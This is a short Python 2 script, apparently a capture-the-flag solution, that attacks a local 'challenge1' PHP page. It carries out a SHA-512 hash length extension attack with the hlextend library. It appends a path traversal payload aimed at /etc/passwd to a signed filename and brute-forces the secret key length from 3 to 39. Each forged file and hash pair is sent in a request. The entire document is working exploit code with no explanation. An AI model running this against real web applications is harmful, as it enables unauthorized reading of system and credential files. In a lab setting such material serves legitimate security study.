import hlextend
import requests

url = "http://127.0.0.1/challenge1/index.php"
hashAlgo = "sha512"
hashs = "a674ee005a5e148305be79dea756dd5391e0dcef603eaa6e8776a528fd70fc667182b51d116702055bcd907a674a8604d6dd9e6c7153dc53aeefa64e59e2c714"
filename = "aboutUS"
data = "../../../../../../../../../../../../../../etc/passwd"
sessions = requests.Session()
#brute force key length 
for length in xrange(3, 40):
    sha = hlextend.new(hashAlgo)
    newFileName = sha.extend(data, filename, length, hashs, raw=True)
    newHash = sha.hexdigest()
    print length
    print newHash
    payload = {"file":newFileName,"hash":newHash}
    req = sessions.get(url, params=payload)
    print req.text
